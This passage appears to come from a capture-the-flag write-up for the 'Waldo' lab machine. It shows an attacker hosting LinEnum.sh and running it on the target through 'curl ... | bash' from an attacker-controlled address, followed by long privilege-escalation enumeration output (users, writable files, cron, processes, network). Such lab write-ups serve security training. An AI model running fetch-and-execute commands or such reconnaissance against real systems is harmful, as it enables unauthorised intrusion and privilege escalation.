2019-01-02 19:10:56 (994 KB/s) - ‘LinEnum.sh’ saved [45578/45578]

root@kali:/opt/linux-privesc#
```

```sh
root@kali:/opt/linux-privesc# head LinEnum-tt.sh | grep thorough
thorough=1
root@kali:/opt/linux-privesc#
```

```sh
root@kali:/opt/linux-privesc# python -m SimpleHTTPServer 9001
Serving HTTP on 0.0.0.0 port 9001 ...
10.10.10.87 - - [02/Jan/2019 19:12:06] "GET /LinEnum-tt.sh HTTP/1.1" 200 -
```

```sh
monitor@waldo:~$ curl http://10.10.14.9:9001/LinEnum-tt.sh | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 45588  100 45588    0     0   248k      0 --:--:-- --:--:-- --:--:--  250k

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.94

[-] Debug Info
[+] Thorough tests = Enabled


Scan started at:
Wed Jan  2 19:26:29 EST 2019


### SYSTEM ##############################################
[-] Kernel information:
Linux waldo 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1 (2018-04-29) x86_64 GNU/Linux


[-] Kernel information (continued):
Linux version 4.9.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18+deb9u1) ) #1 SMP Debian 4.9.88-1 (2018-04-29)


[-] Specific release information:
PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
NAME="Debian GNU/Linux"
VERSION_ID="9"
VERSION="9 (stretch)"
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"


[-] Hostname:
waldo


### USER/GROUP ##########################################
[-] Current user/group info:
uid=1001(monitor) gid=1001(monitor) groups=1001(monitor)


[-] Who else is logged on:
 19:26:29 up 2 days, 22:56,  1 user,  load average: 0.02, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
monitor  pts/0    127.0.0.1        19:03    3.00s  2:59   0.00s bash


[-] Group memberships:
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(avahi-autoipd) gid=109(avahi-autoipd) groups=109(avahi-autoipd)
uid=106(messagebus) gid=110(messagebus) groups=110(messagebus)
uid=107(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(steve) gid=1000(steve) groups=1000(steve),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(bluetooth)
uid=1001(monitor) gid=1001(monitor) groups=1001(monitor)
uid=1002(app-dev) gid=1002(app-dev) groups=1002(app-dev)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
avahi-autoipd:x:105:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
steve:x:1000:1000:steve,,,:/home/steve:/bin/bash
monitor:x:1001:1001:User for editing source and monitoring logs,,,:/home/monitor:/bin/rbash
app-dev:x:1002:1002:User for managing app-dev,,,:/home/app-dev:/bin/bash


[-] Super user account(s):
root


[-] Are permissions on /home directories lax:
total 20K
drwxr-xr-x  5 root    root    4.0K May  3  2018 .
drwxr-xr-x 22 root    root    4.0K May  1  2018 ..
drwxr-xr-x  2 app-dev app-dev 4.0K May  3  2018 app-dev
drwxr-x---  5 root    monitor 4.0K Jul 24 07:58 monitor
drwxr-xr-x  2 steve   steve   4.0K May  1  2018 steve


[-] Files not owned by user but writable by group:
-rw-rw---- 1 app-dev monitor 6824 May  3  2018 /home/monitor/app-dev/logMonitor.o
-rw-rw---- 1 app-dev monitor 2677 May  3  2018 /home/monitor/app-dev/logMonitor.c
-rw-rw---- 1 app-dev monitor 488 May  3  2018 /home/monitor/app-dev/logMonitor.h
-rwxrwx--- 1 app-dev monitor 13704 Jan  2 19:11 /home/monitor/app-dev/logMonitor
-rw-rw---- 1 app-dev monitor 2217712 May  3  2018 /home/monitor/app-dev/logMonitor.h.gch


[-] Files owned by our user:
-r-------- 1 monitor monitor 394 May  3  2018 /home/monitor/.ssh/authorized_keys


[-] Hidden files:
-rw-r--r-- 1 root root 0 Dec 30 20:30 /run/network/.ifstate.lock
-rwxr-xr-x 1 root root 623 Apr 10  2018 /usr/share/docker-ce/contrib/mkimage/.febootstrap-minimize
-r--r----- 1 root monitor 15 May  3  2018 /home/monitor/.bash_login
-r--r----- 1 root monitor 15 May  3  2018 /home/monitor/.bash_profile
-r--r----- 1 root monitor 3598 May  3  2018 /home/monitor/.bashrc
-r--r----- 1 root monitor 15 May  3  2018 /home/monitor/.bash_logout
-r--r----- 1 root monitor 15 May  3  2018 /home/monitor/.profile
-r-xr-x--- 1 app-dev monitor 795 May  3  2018 /home/monitor/app-dev/.restrictScript.sh
-rw-r--r-- 1 steve steve 3526 May  1  2018 /home/steve/.bashrc
-rw-r--r-- 1 steve steve 220 May  1  2018 /home/steve/.bash_logout
-rw-r--r-- 1 steve steve 675 May  1  2018 /home/steve/.profile
-rw-r--r-- 1 app-dev app-dev 3526 May  3  2018 /home/app-dev/.bashrc
-rw-r--r-- 1 app-dev app-dev 220 May  3  2018 /home/app-dev/.bash_logout
-rw-r--r-- 1 app-dev app-dev 675 May  3  2018 /home/app-dev/.profile
-rw-r--r-- 1 root root 102 Oct  7  2017 /etc/cron.monthly/.placeholder
-rw-r--r-- 1 root root 102 Oct  7  2017 /etc/cron.weekly/.placeholder
-rw------- 1 root root 0 May  1  2018 /etc/.pwd.lock
-rw-r--r-- 1 root root 102 Oct  7  2017 /etc/cron.daily/.placeholder
-rw-r--r-- 1 root root 102 Oct  7  2017 /etc/cron.hourly/.placeholder
-rw-r--r-- 1 root root 3526 May 15  2017 /etc/skel/.bashrc
-rw-r--r-- 1 root root 220 May 15  2017 /etc/skel/.bash_logout
-rw-r--r-- 1 root root 675 May 15  2017 /etc/skel/.profile
-rw-r--r-- 1 root root 102 Oct  7  2017 /etc/cron.d/.placeholder


[-] World-readable files within /home:
-rw-r--r-- 1 steve steve 3526 May  1  2018 /home/steve/.bashrc
-rw-r--r-- 1 steve steve 220 May  1  2018 /home/steve/.bash_logout
-rw-r--r-- 1 steve steve 675 May  1  2018 /home/steve/.profile
-rw-r--r-- 1 app-dev app-dev 3526 May  3  2018 /home/app-dev/.bashrc
-rw-r--r-- 1 app-dev app-dev 220 May  3  2018 /home/app-dev/.bash_logout
-rw-r--r-- 1 app-dev app-dev 675 May  3  2018 /home/app-dev/.profile


[-] Home directory contents:
total 40K
drwxr-x--- 5 root    monitor 4.0K Jul 24 07:58 .
drwxr-xr-x 5 root    root    4.0K May  3  2018 ..
drwxrwx--- 3 app-dev monitor 4.0K May  3  2018 app-dev
lrwxrwxrwx 1 root    root       9 Jul 24 07:58 .bash_history -> /dev/null
-r--r----- 1 root    monitor   15 May  3  2018 .bash_login
-r--r----- 1 root    monitor   15 May  3  2018 .bash_logout
-r--r----- 1 root    monitor   15 May  3  2018 .bash_profile
-r--r----- 1 root    monitor 3.6K May  3  2018 .bashrc
dr-xr-x--- 2 root    monitor 4.0K May  3  2018 bin
-r--r----- 1 root    monitor   15 May  3  2018 .profile
dr-x------ 2 monitor monitor 4.0K May  3  2018 .ssh


[-] SSH keys/host information found in the following locations:
-r-------- 1 monitor monitor 394 May  3  2018 /home/monitor/.ssh/authorized_keys


### ENVIRONMENTAL #######################################
[-] Environment information:
SSH_CONNECTION=127.0.0.1 58614 127.0.0.1 22
LANG=en_US.UTF-8
XDG_SESSION_ID=80
USER=monitor
PWD=/home/monitor
HOME=/home/monitor
SSH_CLIENT=127.0.0.1 58614 22
SSH_TTY=/dev/pts/0
MAIL=/var/mail/monitor
TERM=xterm-256color
SHELL=/bin/rbash
SHLVL=5
LOGNAME=monitor
XDG_RUNTIME_DIR=/run/user/1001
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env


[-] Path information:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash


[-] Current umask value:
0111
u=rw,g=rw,o=rw


[-] umask value as specified in /etc/login.defs:
UMASK		022


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Oct  7  2017 /etc/crontab

/etc/cron.d:
total 16
drwxr-xr-x  2 root root 4096 May  1  2018 .
drwxr-xr-x 80 root root 4096 Jul 24 05:50 ..
-rw-r--r--  1 root root  285 May 29  2017 anacron
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder

/etc/cron.daily:
total 40
drwxr-xr-x  2 root root 4096 May  1  2018 .
drwxr-xr-x 80 root root 4096 Jul 24 05:50 ..
-rwxr-xr-x  1 root root  311 May 29  2017 0anacron
-rwxr-xr-x  1 root root 1474 Sep 13  2017 apt-compat
-rwxr-xr-x  1 root root  355 Oct 25  2016 bsdmainutils
-rwxr-xr-x  1 root root 1597 Feb 22  2017 dpkg
-rwxr-xr-x  1 root root   89 May  5  2015 logrotate
-rwxr-xr-x  1 root root 1065 Dec 13  2016 man-db
-rwxr-xr-x  1 root root  249 May 17  2017 passwd
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 May  1  2018 .
drwxr-xr-x 80 root root 4096 Jul 24 05:50 ..
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder

/etc/cron.monthly:
total 16
drwxr-xr-x  2 root root 4096 May  1  2018 .
drwxr-xr-x 80 root root 4096 Jul 24 05:50 ..
-rwxr-xr-x  1 root root  313 May 29  2017 0anacron
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 May  1  2018 .
drwxr-xr-x 80 root root 4096 Jul 24 05:50 ..
-rwxr-xr-x  1 root root  312 May 29  2017 0anacron
-rwxr-xr-x  1 root root  723 Dec 13  2016 man-db
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


[-] Anacron jobs and associated file permissions:
-rw-r--r-- 1 root root 401 May 29  2017 /etc/anacrontab
# /etc/anacrontab: configuration file for anacron

# See anacron(8) and anacrontab(5) for details.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
HOME=/root
LOGNAME=root

# These replace cron's entries
1	5	cron.daily	run-parts --report /etc/cron.daily
7	10	cron.weekly	run-parts --report /etc/cron.weekly
@monthly	15	cron.monthly	run-parts --report /etc/cron.monthly


[-] When were jobs last executed (/var/spool/anacron contents):
total 20
drwxr-xr-x 2 root root 4096 May  3  2018 .
drwxr-xr-x 5 root root 4096 May  1  2018 ..
-rw------- 1 root root    9 Jan  2 00:08 cron.daily
-rw------- 1 root root    9 Dec 30 20:45 cron.monthly
-rw------- 1 root root    9 Dec 30 20:40 cron.weekly


[-] Systemd timers:
NEXT                         LEFT          LAST                         PASSED    UNIT                         ACTIVATES
Wed 2019-01-02 20:00:44 EST  34min left    Wed 2019-01-02 19:01:10 EST  25min ago anacron.timer                anacron.service
Wed 2019-01-02 20:45:09 EST  1h 18min left Tue 2019-01-01 20:45:09 EST  22h ago   systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Wed 2019-01-02 23:31:04 EST  4h 4min left  Wed 2019-01-02 12:55:08 EST  6h ago    apt-daily.timer              apt-daily.service
Thu 2019-01-03 06:43:26 EST  11h left      Wed 2019-01-02 06:34:06 EST  12h ago   apt-daily-upgrade.timer      apt-daily-upgrade.service

4 timers listed.



### NETWORKING  ##########################################
[-] Network and IP info:
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b2:e0:04 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.87/24 brd 10.10.10.255 scope global ens33
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default
    link/ether 02:42:c7:33:f4:e6 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever


[-] ARP history:
10.10.10.2 dev ens33 lladdr 00:50:56:b2:92:d3 REACHABLE


[-] Nameserver(s):
nameserver 10.10.10.2


[-] Nameserver(s):
Global
         DNS Servers: 10.10.10.2
          DNS Domain: localdomain
          DNSSEC NTA: 10.in-addr.arpa
                      16.172.in-addr.arpa
                      168.192.in-addr.arpa
                      17.172.in-addr.arpa
                      18.172.in-addr.arpa
                      19.172.in-addr.arpa
                      20.172.in-addr.arpa
                      21.172.in-addr.arpa
                      22.172.in-addr.arpa
                      23.172.in-addr.arpa
                      24.172.in-addr.arpa
                      25.172.in-addr.arpa
                      26.172.in-addr.arpa
                      27.172.in-addr.arpa
                      28.172.in-addr.arpa
                      29.172.in-addr.arpa
                      30.172.in-addr.arpa
                      31.172.in-addr.arpa
                      corp
                      d.f.ip6.arpa
                      home
                      internal
                      intranet
                      lan
                      local
                      private
                      test

Link 3 (docker0)
      Current Scopes: none
       LLMNR setting: yes
MulticastDNS setting: no
      DNSSEC setting: no
    DNSSEC supported: no

Link 2 (ens33)
      Current Scopes: LLMNR/IPv4
       LLMNR setting: yes
MulticastDNS setting: no
      DNSSEC setting: no
    DNSSEC supported: no


[-] Default route:
default via 10.10.10.2 dev ens33 onlink


[-] Listening TCP:
State      Recv-Q Send-Q Local Address:Port                 Peer Address:Port
ESTAB      0      3788   10.10.10.87:8888                 10.10.14.9:44234
ESTAB      0      0      127.0.0.1:58614                127.0.0.1:ssh
ESTAB      0      0      127.0.0.1:ssh                  127.0.0.1:58614


### SERVICES #############################################
[-] Running processes:
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          1  0.0  0.6  56912  6604 ?        Ss    2018   0:04 /sbin/init
root          2  0.0  0.0      0     0 ?        S     2018   0:00 [kthreadd]
root          3  0.0  0.0      0     0 ?        S     2018   0:01 [ksoftirqd/0]
root          5  0.0  0.0      0     0 ?        S<    2018   0:00 [kworker/0:0H]
root          7  0.0  0.0      0     0 ?        S     2018   0:02 [rcu_sched]
root          8  0.0  0.0      0     0 ?        S     2018   0:00 [rcu_bh]
root          9  0.0  0.0      0     0 ?        S     2018   0:00 [migration/0]
root         10  0.0  0.0      0     0 ?        S<    2018   0:00 [lru-add-drain]
root         11  0.0  0.0      0     0 ?        S     2018   0:00 [watchdog/0]
root         12  0.0  0.0      0     0 ?        S     2018   0:00 [cpuhp/0]
root         13  0.0  0.0      0     0 ?        S     2018   0:00 [kdevtmpfs]
root         14  0.0  0.0      0     0 ?        S<    2018   0:00 [netns]
root         15  0.0  0.0      0     0 ?        S     2018   0:00 [khungtaskd]
root         16  0.0  0.0      0     0 ?        S     2018   0:00 [oom_reaper]
root         17  0.0  0.0      0     0 ?        S<    2018   0:00 [writeback]
root         18  0.0  0.0      0     0 ?        S     2018   0:00 [kcompactd0]
root         19  0.0  0.0      0     0 ?        SN    2018   0:00 [ksmd]
root         21  0.0  0.0      0     0 ?        SN    2018   0:00 [khugepaged]
root         22  0.0  0.0      0     0 ?        S<    2018   0:00 [crypto]
root         23  0.0  0.0      0     0 ?        S<    2018   0:00 [kintegrityd]
root         24  0.0  0.0      0     0 ?        S<    2018   0:00 [bioset]
root         25  0.0  0.0      0     0 ?        S<    2018   0:00 [kblockd]
root         26  0.0  0.0      0     0 ?        S<    2018   0:00 [devfreq_wq]
root         27  0.0  0.0      0     0 ?        S<    2018   0:00 [watchdogd]
root         28  0.0  0.0      0     0 ?        S     2018   0:00 [kswapd0]
root         29  0.0  0.0      0     0 ?        S<    2018   0:00 [vmstat]
root         41  0.0  0.0      0     0 ?        S<    2018   0:00 [kthrotld]
root         42  0.0  0.0      0     0 ?        S<    2018   0:00 [ipv6_addrconf]
root         75  0.0  0.0      0     0 ?        S<    2018   0:00 [ata_sff]
root         76  0.0  0.0      0     0 ?        S     2018   0:00 [scsi_eh_0]
root         77  0.0  0.0      0     0 ?        S<    2018   0:00 [scsi_tmf_0]
root         78  0.0  0.0      0     0 ?        S     2018   0:00 [scsi_eh_1]
root         79  0.0  0.0      0     0 ?        S<    2018   0:00 [vmw_pvscsi_wq_0]
root         80  0.0  0.0      0     0 ?        S<    2018   0:00 [scsi_tmf_1]
root         81  0.0  0.0      0     0 ?        S     2018   0:01 [kworker/u256:1]
root         82  0.0  0.0      0     0 ?        S     2018   0:00 [scsi_eh_2]
root         83  0.0  0.0      0     0 ?        S<    2018   0:00 [bioset]
root         84  0.0  0.0      0     0 ?        S<    2018   0:00 [scsi_tmf_2]
root         86  0.0  0.0      0     0 ?        S     2018   0:00 [kworker/u256:2]
root        128  0.0  0.0      0     0 ?        S<    2018   0:00 [bioset]
root        132  0.0  0.0      0     0 ?        S<    2018   0:00 [kworker/0:1H]
root        166  0.0  0.0      0     0 ?        S     2018   0:00 [jbd2/sda1-8]
root        167  0.0  0.0      0     0 ?        S<    2018   0:00 [ext4-rsv-conver]
root        190  0.0  0.5  56800  5024 ?        Ss    2018   0:01 /lib/systemd/systemd-journald
root        193  0.0  1.0 133772 10432 ?        Ss    2018   2:30 /usr/bin/vmtoolsd
root        194  0.0  0.0      0     0 ?        S     2018   0:00 [kauditd]
root        224  0.0  0.4  46792  4876 ?        Ss    2018   0:00 /lib/systemd/systemd-udevd
root        281  0.0  0.0      0     0 ?        S<    2018   0:00 [ttm_swap]
systemd+    316  0.0  0.4 127284  4068 ?        Ssl   2018   0:13 /lib/systemd/systemd-timesyncd
root        343  0.0  0.0      0     0 ?        S<    2018   0:00 [edac-poller]
root        392  0.0  0.4  46520  4724 ?        Ss    2018   0:00 /lib/systemd/systemd-logind
message+    393  0.0  0.4  45160  4100 ?        Ss    2018   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root        400  0.0  0.3 250116  3204 ?        Ssl   2018   0:00 /usr/sbin/rsyslogd -n
root        401  0.0  0.2  29664  2796 ?        Ss    2018   0:00 /usr/sbin/cron -f
root        402  0.0  1.8 153488 18408 ?        Ss    2018   0:00 /usr/bin/VGAuthService
root        508  0.0  6.4 386980 64760 ?        Ssl   2018   4:14 /usr/bin/dockerd -H fd://
root        513  0.0  0.1  14536  1732 tty1     Ss+   2018   0:00 /sbin/agetty --noclear tty1 linux
root        516  0.0  0.5  69944  5472 ?        Ss    2018   0:00 /usr/sbin/sshd -D
root        608  0.0  2.2 243212 22356 ?        Ssl   2018   3:18 docker-containerd --config /var/run/docker/containerd/containerd.toml
root        735  0.0  0.4   9056  4152 ?        Sl    2018   0:25 docker-containerd-shim -namespace moby -workdir /var/lib/docker/containerd/daemon/io.containerd.runtime.v1.linux/moby/16c6cae0786900838a54b9b3ce253ddd80c3ccdcea93e6c5444e2a8a5a1eaebd -address /var/run/docker/containerd/docker-containerd.sock -containerd-binary /usr/bin/docker-containerd -runtime-root /var/run/docker/runtime-runc
root        750  0.0  1.6  85124 16808 pts/0    Ss+   2018   1:35 /usr/bin/python2 /usr/bin/supervisord -c /etc/supervisor/conf.d/supervisord.conf
root        780  0.0  0.3  12784  3388 pts/0    S     2018   0:00 nginx: master process nginx -g daemon off;
root        781  0.0  0.2   7320  2628 pts/0    S     2018   0:00 /usr/sbin/sshd -D -e
root        782  0.0  1.7 133368 17596 pts/0    S     2018   0:16 php-fpm: master process (/etc/php7/php-fpm.conf)
systemd+    783  0.0  0.2  13404  2544 pts/0    S     2018   1:07 nginx: worker process
root       3190  0.0  0.2   7352  2700 ?        Ss   18:50   0:00 sshd: nobody [priv]
nobody     3192  0.0  0.1   7396  1984 ?        S    18:50   0:00 sshd: nobody@pts/1
nobody     3193  0.0  0.0   1540   956 ?        Ss   18:50   0:00 -sh
root       3197  0.0  0.0      0     0 ?        S    18:53   0:00 [kworker/0:0]
nobody     3259  0.0  0.2   7412  2772 ?        S+   19:02   0:00 ssh -i .monitor monitor@127.0.0.1
root       3260  0.0  0.6 101380  6840 ?        Ss   19:02   0:00 sshd: monitor [priv]
monitor    3262  0.0  0.6  64872  6236 ?        Ss   19:02   0:00 /lib/systemd/systemd --user
monitor    3263  0.0  0.1  84496  1524 ?        S    19:02   0:00 (sd-pam)
monitor    3269  0.0  0.3 101380  3880 ?        S    19:02   0:00 sshd: monitor@pts/0
monitor    3270  0.0  0.4  21176  4880 pts/0    Ss   19:02   0:00 -rbash
monitor    3293  0.0  0.2  11188  2844 pts/0    S    19:11   0:00 /bin/bash /home/monitor/app-dev/.restrictScript.sh /home/monitor/app-dev/logMonitor
monitor    3307  0.0  0.4  21140  4772 pts/0    S    19:11   0:00 /tmp/tmp.LZf3DgyKqq
monitor    3315  0.0  0.4  21140  4844 pts/0    S    19:12   0:00 bash
systemd+   3489  0.0  0.4  49620  4036 ?        Ss   19:16   0:00 /lib/systemd/systemd-resolved
root       3700  0.0  0.0      0     0 ?        S    19:17   0:00 [kworker/0:2]
root       3702  0.0  0.0      0     0 ?        S    19:22   0:00 [kworker/0:1]
monitor    4212  0.6  0.3  12152  3920 pts/0    S+   19:26   0:00 bash
monitor    4213  0.0  0.3  12196  3464 pts/0    S+   19:26   0:00 bash
monitor    4214  0.0  0.0   5844   696 pts/0    S+   19:26   0:00 tee -a
monitor    4441  0.0  0.2  12196  2768 pts/0    S+   19:26   0:00 bash
monitor    4442  0.0  0.3  38304  3300 pts/0    R+   19:26   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
776K -rwxr-xr-x 1 root root 773K Mar  1  2018 /usr/sbin/sshd
640K -rwxr-xr-x 1 root root 637K Jan 18  2017 /usr/sbin/rsyslogd
 48K -rwxr-xr-x 1 root root  48K Oct  7  2017 /usr/sbin/cron
 48K -rwxr-xr-x 1 root root  48K Jul 25  2017 /usr/bin/vmtoolsd
152K -rwxr-xr-x 1 root root 149K Jul 25  2017 /usr/bin/VGAuthService
   0 lrwxrwxrwx 1 root root    9 Jan 24  2017 /usr/bin/python2 -> python2.7
 79M -rwxr-xr-x 1 root root  79M Apr 10  2018 /usr/bin/dockerd
220K -rwxr-xr-x 1 root root 219K Mar  2  2018 /usr/bin/dbus-daemon
   0 lrwxrwxrwx 1 root root   20 Mar 23  2018 /sbin/init -> /lib/systemd/systemd
 60K -rwxr-xr-x 1 root root  57K Mar  7  2018 /sbin/agetty
456K -rwxr-xr-x 1 root root 455K Mar 23  2018 /lib/systemd/systemd-udevd
 40K -rwxr-xr-x 1 root root  39K Mar 23  2018 /lib/systemd/systemd-timesyncd
316K -rwxr-xr-x 1 root root 315K Mar 23  2018 /lib/systemd/systemd-resolved
204K -rwxr-xr-x 1 root root 203K Mar 23  2018 /lib/systemd/systemd-logind
120K -rwxr-xr-x 1 root root 119K Mar 23  2018 /lib/systemd/systemd-journald
1.1M -rwxr-xr-x 1 root root 1.1M Mar 23  2018 /lib/systemd/systemd
1.1M -rwxr-xr-x 1 root root 1.1M May 15  2017 /bin/bash


[-] /etc/init.d/ binary permissions:
total 88
drwxr-xr-x  2 root root 4096 Jul 15 09:48 .
drwxr-xr-x 80 root root 4096 Jul 24 05:50 ..
-rwxr-xr-x  1 root root 2014 May 29  2017 anacron
-rwxr-xr-x  1 root root 2948 Sep 13  2017 bluetooth
-rwxr-xr-x  1 root root 1232 Apr  6  2017 console-setup.sh
-rwxr-xr-x  1 root root 3049 Oct  7  2017 cron
-rwxr-xr-x  1 root root 2813 Mar  2  2018 dbus
-rwxr-xr-x  1 root root 3843 Apr 10  2018 docker
-rwxr-xr-x  1 root root 3809 Mar 22  2017 hwclock.sh
-rwxr-xr-x  1 root root 1479 May 18  2016 keyboard-setup.sh
-rwxr-xr-x  1 root root 2044 Dec 25  2016 kmod
-rwxr-xr-x  1 root root 1364 Mar 17  2017 netfilter-persistent
-rwxr-xr-x  1 root root 4597 Sep 16  2016 networking
-rwxr-xr-x  1 root root 1846 Jul 25  2017 open-vm-tools
-rwxr-xr-x  1 root root 1191 Nov 22  2016 procps
-rwxr-xr-x  1 root root 4355 Dec 10  2017 rsync
-rwxr-xr-x  1 root root 2868 Jan 18  2017 rsyslog
-rwxr-xr-x  1 root root 4033 Mar  1  2018 ssh
-rwxr-xr-x  1 root root 6087 Dec  3  2017 udev


[-] /etc/init/ config file permissions:
total 48
drwxr-xr-x  2 root root 4096 May  3  2018 .
drwxr-xr-x 80 root root 4096 Jul 24 05:50 ..
-rw-r--r--  1 root root  278 May 29  2017 anacron.conf
-rw-r--r--  1 root root 1875 Apr 10  2018 docker.conf
-rw-r--r--  1 root root 2493 Jun  2  2015 networking.conf
-rw-r--r--  1 root root  933 Jun  2  2015 network-interface.conf
-rw-r--r--  1 root root  530 Jun  2  2015 network-interface-container.conf
-rw-r--r--  1 root root 1756 Jun  2  2015 network-interface-security.conf
-rw-r--r--  1 root root  637 Mar  1  2018 ssh.conf
-rw-r--r--  1 root root  337 Dec  3  2017 udev.conf
-rw-r--r--  1 root root  360 Dec  3  2017 udevmonitor.conf
-rw-r--r--  1 root root  352 Dec  3  2017 udevtrigger.conf


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 5.3M
drwxr-xr-x 19 root root  32K Jul 15 09:48 system
drwxr-xr-x  2 root root 4.0K May  1  2018 system-sleep
drwxr-xr-x  2 root root 4.0K May  1  2018 network
drwxr-xr-x  2 root root 4.0K May  1  2018 system-generators
drwxr-xr-x  2 root root 4.0K May  1  2018 system-preset
-rw-r--r--  1 root root 2.2M Mar 23  2018 libsystemd-shared-232.so
-rw-r--r--  1 root root  484 Mar 23  2018 resolv.conf
-rwxr-xr-x  1 root root 1.1M Mar 23  2018 systemd
-rwxr-xr-x  1 root root 6.3K Mar 23  2018 systemd-ac-power
-rwxr-xr-x  1 root root  19K Mar 23  2018 systemd-backlight
